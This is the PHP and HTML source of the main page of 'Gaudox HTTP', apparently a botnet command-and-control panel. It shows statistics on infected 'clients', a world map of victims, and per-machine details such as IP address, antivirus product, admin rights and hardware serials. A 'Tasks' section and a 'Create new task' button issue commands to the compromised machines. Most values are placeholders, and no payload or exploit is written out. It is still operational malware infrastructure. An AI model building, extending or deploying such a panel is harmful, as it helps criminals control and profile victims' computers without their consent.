<?php
    session_start();
    include_once("gdx/utility.php");
    include_once("gdx/gdx.php");
    include_once("gdx/internal.php");
    
    //if(ExistSetupFile()) die("setup.php still exists");
    
    $option = GDX_STATISTICS_OPT;
    if (isset($_GET["op"])) {
        $option = $_GET["op"];
    }
    
    try
    {
        $Host = MYSQL_HOST;
        $Database = DATABASE_NAME;
        $conn = new PDO("mysql:host=$Host;dbname=$Database", MYSQL_USER, MYSQL_PASSWORD);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $gdx = new GDX($conn);
        echo $gdx->GdxPage($option);
        
    } catch (PDOException $err) {
        echo $err->getMessage();
    }
    
?>


<!DOCTYPE HTML>
<html>
    <head>
    <title>Control Panel</title>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    
    <link href="css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="css/jqvmap.css" rel="stylesheet" type="text/css"/>
    <link href="css/jquery.jqplot.min.css" rel="stylesheet" type="text/css"/>
    <link href="css/bootstrap.css" rel="stylesheet" type="text/css"/>
    <link href="css/gdx.css" rel="stylesheet" type="text/css"/>
    
    <script src="js/jquery.js" type="text/javascript"></script>
    <script src="js/jquery.vmap.js" type="text/javascript"></script>
    <script src="js/jquery.vmap.world.js" type="text/javascript"></script>
    <script src="js/jquery.jqplot.min.js" type="text/javascript"></script>
    <script src="js/jqplot.pieRenderer.min.js" type="text/javascript"></script>
    <script src="js/bootstrap.js" type="text/javascript"></script>
    <script src="js/gdx.js" type="text/javascript"></script>
    
    <script>
        jQuery(document).ready(function () {
            var ch = {
                US: '#f60',
            }
            
            jQuery('#cmap').vectorMap({
                map: 'world_en',
                colors: ch,
                borderColor: '#000',
                borderOpacity: 0,
                borderWidth: 1,
                backgroundColor: '#ffffff',
                hoverColor: '#263D4E',
                selectedColor: '#666666',
                enableZoom: true,
                showTooltip: true,
                normalizeFunction: 'polynomial'
            });
        });
        
        jQuery(document).ready(function(){
        var data = [ ['', 0],['', 0],['', 0], ['', 0],['', 1] ];
            var plot1 = jQuery.jqplot ('chart', [data], 
            { 
                title: 'TOP 5 countries',
                seriesColors: [ "#6C6CD9", "#84D96C", "#D96C6C", "#D9D56C", "#6CD2D9"],
                seriesDefaults: {
                    renderer: jQuery.jqplot.PieRenderer, 
                    rendererOptions: {
                        showDataLabels: true
                    }
                }, 
                legend: { show:true, location: 'e' },
            }
            );
        });
    </script>
    </head>
    <body>
        <nav class="navbar navbar-inverse navbar-static-top" role="navigation">
        <div class="navbar-header">
          <a class="navbar-brand" href="main.php">Gaudox HTTP</a>
        </div>
        <div class="collapse navbar-collapse navbar-ex1-collapse">
            <ul class="nav navbar-nav side-nav">
                <li><a href="main.php?op=statistics"><i class="fa fa-bar-chart-o gdx-opt"></i> Statistics</a></li>
                <li><a href="main.php?op=clients"><i class="fa fa-users gdx-opt"></i> Clients</a></li>
                <li><a href="main.php?op=tasks"><i class="fa fa-tasks gdx-opt"></i> Tasks</a></li>
                <li><a href="main.php?op=settings"><i class="fa fa-wrench gdx-opt"></i> Settings</a></li>
            </ul>
            <ul class="nav navbar-nav navbar-right navbar-user">
                <li class="dropdown user-dropdown">
                    <a href="" class="dropdown-toggle gdx-opt" data-toggle="dropdown"><i class="fa fa-user"></i> Admin <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        <li><a href="#"><i class="fa fa-power-off gdx-opt"></i> Logout</a></li>
                    </ul>
                </li>
            </ul>
        </div>
        </nav>
        
        
        <div class="container-fluid">
        
            <div class="gdx-chartmap">
                <div class="gdx-statis">
                    <div class="panel panel-default">
                        <div class="panel-heading panel-heading-sm">
                            <p class="panel-title panel-title-sm gdx-statis-title">Statistics</p>
                        </div>
                        <div class="panel-body panel-body-sm gdx-panel-statis-body">
                            <div class='gdx-panel-statis-table'>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Total Clients:</div>
                                    <div>0</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients Online:</div>
                                    <div>0</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients online (Past 3h):</div>
                                    <div>0</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients online (Past 24h):</div>
                                    <div>0</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients online (Past 3days):</div>
                                    <div>0</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients online (Past 7days):</div>
                                    <div>0</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>New Clients (Past 24h):</div>
                                    <div>0</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>New Clients (Past 3days):</div>
                                    <div>0</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients Offline:</div>
                                    <div>0</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients Dead:</div>
                                    <div>0</div>
                                </div>
                                <hr>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="gdx-chart" id="chart"></div>
                <div class="gdx-map">
                    <div class="gdx-map-map" id="cmap"></div>
                    <div class="gdx-map-label">
                        <div class="gdx-map-clbox" style="background-color: #12FF14"></div> 1 - 50 | 
                        <div class="gdx-map-clbox" style="background-color: #0C962C"></div> 51 - 200 | 
                        <div class="gdx-map-clbox" style="background-color: #FFFB14"></div> 201 - 500 | 
                        <div class="gdx-map-clbox" style="background-color: #FF9914"></div> 501 - 1000 | 
                        <div class="gdx-map-clbox" style="background-color: #FF1414"></div> 1001 - 5000 | 
                        <div class="gdx-map-clbox" style="background-color: #A30000"></div> 5001+
                    </div>
                </div>
            </div>
            <hr></hr>
            <div class="form-inline">
                Number of clients per page:
                <select class="form-control gdx-select" style="width:80px">
                    <option>50</option>
                    <option>100</option>
                    <option>200</option>
                    <option>500</option>
                </select>&nbsp;&nbsp;&nbsp;
                Sorting:
                <select class="form-control gdx-select" style="width:240px">
                    <option>Online Status</option>
                </select>&nbsp;&nbsp;&nbsp;

                <button type="button" class="btn btn-primary btn-xs">Set Options</button>
            </div>
            <hr></hr>
            
            <p style="font-size:14px">Total Clients: 0</p>
            <table class="table table-bordered">
            <thead>
                <tr>
                    <th style="width:280px">Client ID</th>
                    <th style="width:80px">Version</th>
                    <th style="width:120px">IP Address</th>
                    <th style="width:80px">Location</th>
                    <th style="width:200px">O.S / Architecture</th>
                    <th style="width:180px">Antivirus</th>
                    <th style="width:180px">Install Date</th>
                    <th style="width:180px">Last Check</th>
                    <th style="width:auto; text-align: center">Status</th>
                    <th style="width:auto; text-align: center">Options</th>
                </tr>
            </thead>
            <tbody>
                <div id="test_id">
                    <tr>
                        <td>Text1</td>
                        <td>Text2</td>
                        <td>Text3</td>
                        <td>Text4</td>
                        <td>Text5</td>
                        <td>Text6</td>
                        <td>Text7</td>
                        <td>Text8</td>
                        <td align="center"><span class="label label-success">Online</span></td>
                        <td align="center">
                            <a href="main.php?client=value#id">Details</a>
                        </td>
                    </tr>
                    <tr>
                        <td colspan="10">
                            <div style="display: table; width: 100%">
                                <button type="button" class="btn btn-primary btn-xs">Create new task</button>
                                <hr></hr>
                                
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Client ID: </b>
                                    </div>
                                    <div class="gdx-cltdet" style="width: 30%">
                                        <b>Version: </b>
                                    </div>
                                    <div class="gdx-cltdet">
                                        <b>Has Admin Rights: </b>
                                    </div>
                                </div>
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>IP Address: </b>
                                    </div>
                                    <div class="gdx-cltdet">
                                        <b>Location: </b>
                                    </div>
                                </div>
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Install Date: </b> 
                                    </div>
                                    <div class="gdx-cltdet">
                                        <b>Last Check: </b> 
                                    </div>
                                </div>
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet">
                                        <b>File Path: </b> 
                                    </div>
                                </div>
                                
                                <hr></hr>
                                
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet">
                                        <b>Windows Version: </b>
                                    </div>
                                </div>
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Language: </b> 
                                    </div>
                                </div>
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Serial Number: </b> 
                                    </div>
                                    <div class="gdx-cltdet">
                                        <b>Local Time: </b> 
                                    </div>
                                </div>
                                
                                <hr></hr>
                                
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Antivirus Product: </b> 
                                    </div>
                                </div>
                                
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Default Browser: </b> 
                                    </div>
                                </div>
                                
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Has NET Framework Installed: </b> 
                                    </div>
                                </div>
                                
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Has Java VM Installed: </b> 
                                    </div>
                                </div>
                                
                                <hr></hr>
                                
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet">
                                        <b>Computer Model: </b> 
                                    </div>
                                </div>
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>BIOS: </b> 
                                    </div>
                                    <div class="gdx-cltdet" style="width: 30%">
                                        <b>Version: </b> 
                                    </div>
                                    <div class="gdx-cltdet">
                                        <b>Serial: </b> 
                                    </div>
                                </div>
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>CPU: </b> 
                                    </div>
                                    <div class="gdx-cltdet" style="width: 30%">
                                        <b>Architecture: </b> 
                                    </div>
                                    <div class="gdx-cltdet">
                                        <b>Number Of Processors: </b> 
                                    </div>
                                </div>
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Video Adapter: </b> 
                                    </div>
                                    <div class="gdx-cltdet" style="width: 30%">
                                        <b>Resolution: </b> 
                                    </div>
                                    <div class="gdx-cltdet">
                                        <b>Refresh Rate: </b> 
                                    </div>
                                </div>
                                
                                <hr></hr>
                                
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Physical Memory: </b> 
                                    </div>
                                </div>
                                
                                <hr></hr>
                                
                                <div style="display: inline-block; width: 100%">
                                    <div class="gdx-cltdet" style="width: 40%">
                                        <b>Hard Disk: </b> 
                                    </div>
                                </div>
                                
                            </div>
                        </td>
                    </tr>
                </div>
                <div>
                    <tr>
                        <td><img src="images/flags/ru.png">Text1</td>
                        <td>Text2</td>
                        <td>Text3</td>
                        <td>Text4</td>
                        <td>Text5</td>
                        <td>Text6</td>
                        <td>Text7</td>
                        <td>Text8</td>
                        <td>Text9</td>
                        <td>Text10</td>
                    </tr>
                </div>
            </tbody>
            </table>
            
            <div style="text-align: center">
                <ul class="pagination" style="align:center">
                    <li>
                        <a href="#" aria-label="Previous">
                            <span aria-hidden="true">&laquo;</span>
                        </a>
                    </li>
                
                    <li><a href="#">1</a></li>
                    <li><a href="#">2</a></li>
                    <li><a href="#">3</a></li>
                    <li><a href="#">4</a></li>
                    <li><a href="#">5</a></li>
                    
                    <li>
                        <a href="#" aria-label="Next">
                            <span aria-hidden="true">&raquo;</span>
                        </a>
                    </li>
                </ul>
            </div>
            
        </div>
    </body>
</html>

